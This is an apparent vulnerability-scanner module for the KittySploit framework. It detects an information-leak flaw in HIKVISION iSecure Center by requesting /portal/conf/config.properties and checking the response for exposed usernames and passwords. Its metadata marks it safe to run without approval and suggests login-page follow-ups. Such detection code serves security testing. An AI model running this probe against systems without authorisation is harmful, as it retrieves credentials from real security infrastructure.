#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HIKVISION iSecure Center comprehensive security management platform is an "integrated" and "intelligent" platf."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HIKVISION iSecure Center - Information Leak Detection',
        'description': 'HIKVISION iSecure Center comprehensive security management platform is an "integrated" and "intelligent" platform. By accessing equipment such as video surveillance, all-in-one card, parking lot, alarm detection and other systems, Hikvision comprehensive security management platform information exists Information leakage (internal network centralized account password) vulnerability can be decrypted through decryption software, username and password.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'infoleak', 'iot', 'hikvision', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/adeljck/Hikvision_Info_Leak',
            'https://github.com/wy876/POC/blob/main/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/portal/conf/config.properties', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('@bic', 'username', 'password',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="HIKVISION iSecure Center - Information Leak detected",
                path='/portal/conf/config.properties',
            )
            return True
        return False

